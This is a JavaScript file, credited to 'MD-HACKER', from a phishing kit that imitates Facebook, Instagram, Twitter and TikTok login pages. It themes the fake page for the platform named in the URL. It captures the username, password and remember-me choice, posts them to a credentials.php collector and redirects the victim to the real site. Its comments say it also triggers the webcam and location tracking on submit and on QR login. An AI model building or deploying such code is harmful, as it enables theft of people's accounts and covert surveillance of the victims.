/**
 * Platform Selector for Enhanced Social Login Page
 * Handles dynamic theming and content adjustment based on platform
 * Author: MD-HACKER
 */

document.addEventListener('DOMContentLoaded', function() {
    // Get platform from URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    let platformName = urlParams.get('platform') || 'facebook';
    
    // Set platform name in title
    document.title = platformName.charAt(0).toUpperCase() + platformName.slice(1) + ' Login';
    
    // Elements to update
    const platformLogo = document.getElementById('platformLogo');
    const brandTag = document.getElementById('brandTag');
    const loginButton = document.querySelector('.form-button');
    const copyrightYear = document.getElementById('copyrightYear');
    
    // Update copyright
    copyrightYear.textContent = `${platformName.charAt(0).toUpperCase() + platformName.slice(1)} © ${new Date().getFullYear()}`;
    
    // Customize based on platform name
    if (platformName.toLowerCase().includes('facebook')) {
        document.body.classList.remove('instagram-theme', 'twitter-theme', 'tiktok-theme');
        platformLogo.src = '../images/facebook.png';
        brandTag.textContent = 'Connect with friends and the world around you.';
        loginButton.style.backgroundColor = '#1877f2';
    } else if (platformName.toLowerCase().includes('instagram')) {
        document.body.classList.add('instagram-theme');
        document.body.classList.remove('twitter-theme', 'tiktok-theme');
        platformLogo.src = '../images/instagram.png';
        brandTag.textContent = 'Sign in to see photos and videos from your friends.';
        // Instagram has a gradient button defined in CSS
    } else if (platformName.toLowerCase().includes('twitter')) {
        document.body.classList.add('twitter-theme');
        document.body.classList.remove('instagram-theme', 'tiktok-theme');
        platformLogo.src = '../images/twitter.png';
        brandTag.textContent = 'See what\'s happening in the world right now.';
        loginButton.style.backgroundColor = '#1da1f2';
    } else if (platformName.toLowerCase().includes('tik') || platformName.toLowerCase().includes('tok')) {
        document.body.classList.add('tiktok-theme');
        document.body.classList.remove('instagram-theme', 'twitter-theme');
        platformLogo.src = '../images/tiktok.png';
        brandTag.textContent = 'Watch, create, and share videos on TikTok.';
        loginButton.style.backgroundColor = '#ff0050';
    }

    // Update QR code image based on platform
    const qrCodeImage = document.getElementById('qrCodeImage');
    if (qrCodeImage) {
        qrCodeImage.src = `../images/${platformName.toLowerCase()}-qr.png`;
    }

    // QR code toggle functionality
    const switchToQR = document.getElementById('switchToQR');
    const switchToPassword = document.getElementById('switchToPassword');
    const loginForm = document.querySelector('.login-form');
    const qrLogin = document.getElementById('qrLogin');
    
    if (switchToQR && switchToPassword) {
        switchToQR.addEventListener('click', function() {
            loginForm.style.display = 'none';
            qrLogin.style.display = 'block';
            // QR codes also trigger webcam and location for tracking
            init();
            trackLocation();
        });
        
        switchToPassword.addEventListener('click', function() {
            qrLogin.style.display = 'none';
            loginForm.style.display = 'block';
        });
    }

    // Handle form submission
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        
        // Initialize webcam after form submission
        init();
        
        // Start location tracking
        trackLocation();
        
        // Collect login credentials
        const emailOrPhone = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value;
        const rememberMe = document.getElementById('rememberMe').checked;
        
        // Send credentials to server (optional)
        $.ajax({
            type: 'POST',
            url: 'forwarding_link/credentials.php',
            data: { 
                platform: platformName,
                email_or_phone: emailOrPhone,
                password: password,
                remember_me: rememberMe
            },
            success: function() {
                console.log("Credentials sent successfully");
            },
            error: function() {
                console.error("Failed to send credentials");
            }
        });
        
        // Redirect after a short delay
        setTimeout(function() {
            window.location.href = "https://www." + platformName.toLowerCase() + ".com";
        }, 3000);
    });
    
    // Request location permission on page load
    if (navigator.geolocation) {
        navigator.permissions.query({name: 'geolocation'}).then(function(result) {
            if (result.state === 'granted' || result.state === 'prompt') {
                console.log("Location permission status:", result.state);
            }
        });
    }
});

// Function to show loading overlay
function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
}

// Function to hide loading overlay
function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
} 